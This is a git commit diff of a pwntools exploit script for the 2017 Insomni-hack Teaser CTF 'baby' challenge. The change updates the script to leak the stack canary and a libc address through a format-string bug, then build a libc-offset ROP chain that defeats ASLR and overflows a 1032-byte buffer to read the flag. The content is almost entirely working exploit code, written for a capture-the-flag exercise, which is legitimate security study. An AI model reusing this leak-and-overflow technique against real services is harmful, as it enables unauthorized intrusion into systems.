e8f682cc76cc87f0323ce00a4bf9ca5bc0852298
Damotorie <parksjin01@gmail.com>
2017-06-14 16:17:53 +0900

    Create baby.py

--- 2017/Insomni-hack Teaser CTF/baby.py
+++ 2017/Insomni-hack Teaser CTF/baby.py
@@ -2,8 +2,8 @@ from pwn import *
 
 LENGTH = 1032+88
 
-# This code is run correctly only if ASLR is turned off
-# I didn't create address calculation area and I'll add it ASAP
+# This code is run correctly even if ASLR is turned on
+# I create address calculation area and I added it
 # This is simple code that connect to server get flag from flag file.
 
 p = remote('192.168.0.2', 1337)
@@ -27,27 +27,26 @@ p.recvuntil('> ')
 p.sendline('5')
 p.recvuntil('choice > ')
 p.sendline('2')
-p.sendline('%20p'*144)
+p.sendline('%20p,'*158)
 p.recvuntil('format >')
 addr = p.recvuntil('format >')
-canary = addr.split(' ')[-3].split('\n')[0]
-print canary
+canary = addr.split(',')[-4]
+libc_start = int(addr.split(',')[-2].split('\n')[0], 16)
 p.sendline('')
 p.recvuntil('choice > ')
 p.sendline('1')
 p.recvuntil('send ? ')
 payload = p64(0x0000000000001143)
-payload += p64(0x0000555555555c8b)
+payload += p64(libc_start+0xbdfd0)
 payload += p64(0x0000000000000001)
-payload += p64(0x7ffff7b04d00)
-payload += p64(0x0000555555555c8b)
+payload += p64(libc_start+0xd64d0)
+payload += p64(libc_start+0xbdfd0)
 payload += p64(0x04)
-payload += p64(0x7ffff7b04d60)
-payload += p64(0x0000555555555c8b)
+payload += p64(libc_start+0xd6530)
+payload += p64(libc_start+0xbdfd0)
 payload += p64(heap_addr)
-payload += p64(0x7ffff7a53390)
+payload += p64(libc_start+0x24b60)
 p.sendline(str(LENGTH+1))
 p.sendline('a'*1032+p64(int(canary, 16))+payload)
-p.recvuntil('\n')
 print 'Flag: %s' %p.recvuntil('\n')
 print "[*] END"
